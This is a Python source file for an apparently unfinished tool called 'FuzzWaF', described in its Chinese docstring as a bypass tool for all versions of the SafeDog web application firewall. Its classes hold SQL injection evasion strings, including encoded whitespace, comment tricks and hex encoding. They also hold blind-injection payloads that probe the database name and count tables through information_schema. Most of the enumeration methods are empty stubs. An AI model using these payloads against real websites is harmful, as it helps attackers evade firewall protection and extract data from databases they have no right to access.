#coding:utf-8




'''
安全狗各版本绕过工具.
'''



logo = """

 _____               __        __    _____ 
|  ___|   _ ________ \ \      / /_ _|  ___|
| |_ | | | |_  /_  /  \ \ /\ / / _` | |_   
|  _|| |_| |/ / / /    \ V  V / (_| |  _|  
|_|   \__,_/___/___|    \_/\_/ \__,_|_|   

"""

logo = '\033[1;33m' +'{}'.format(logo)+ '\033[0m'


import random
import urllib


class Payload1(object):
    #attribute
    b = "hello -> b"

    #空格绕过
    Blank_space1 = ["%20","%09","%0a","%0b","%0c","%0d","%a0","%00"]
    Blank_space2 = "/*{}*/"
    Blank_space3 = " "
    #使用浮点数绕过
    floats = None
    #使用括号绕过
    brackets1 = [""]
    brackets2 = "({})"
    #使用十六进制绕过
    hex_qm1 = "0x{}"
    #逗号绕过
    comma1 = "from"
    comma2 = "offset"


class Payload2(object):
    a = "hello -> a"
    payloads1 = ["Xor True","Xor False","%26%26 true","%26%26 false"]
    payloads2 = "/**//*!order*//**/by/**/{}"
    payloads3 = "%20%26%26%20(length(database/**/())={}"
    payloads4 = "%20%26%26%20(length(hex(database/**/()))={}"
    payloads5 = "%20%26%26%20(left(hex(database/**/()),{})={}"

    payloads6 = "%20%26%26%20(1=(select%20count(/*!table_name*/)%20from%20information_Schema.tables%20where%20table_schema=0x{}))"

    
# s = Payload2()
# p = s.payloads3
# pp = p.format("",4)
# print(pp)


# class Payload3(object):
#     c = "hello -> c"


class RePLace(Payload1,Payload2):

    payloads = list

    def __init__(self):
        print(self.b)
        print(self.a)

    def payload(self):
        pass

    def replace(self):
        #Make payload
        pass




class Blind_injection(RePLace):
    '''盲注'''
    def ZRDCS(self):
        # %26 -> &
        pass

    def PDSJKCD(self):
        pass

    def HQSJKM(self):
        pass

    def PDLBCD(self):
        pass

    def HQLBM(self):
        pass

    def PDZDCD(self):
        pass

    def HQZDNR(self):
        pass
    
class Ordinary_injection(RePLace):
    '''普通注入'''
    def Injection_Point(self):
        #判断注入点
        pass

    def ZFDS(self):
        #判断字符段数
        pass

    def KSSZD(self):
        #寻找可显示的字段
        pass

    def CSJKM(self):
        #查数据库名
        pass

    def CBM(self):
        #查表名
        pass

    def CZDM(self):
        #查字段名
        pass

    def CZDSJ(self):
        #查字段数据
        pass



def headers():
    pass


def WAF_Inspect():
    pass


# print('\033[1;33m' + '******************************' + '\033[0m')
# print(logo)


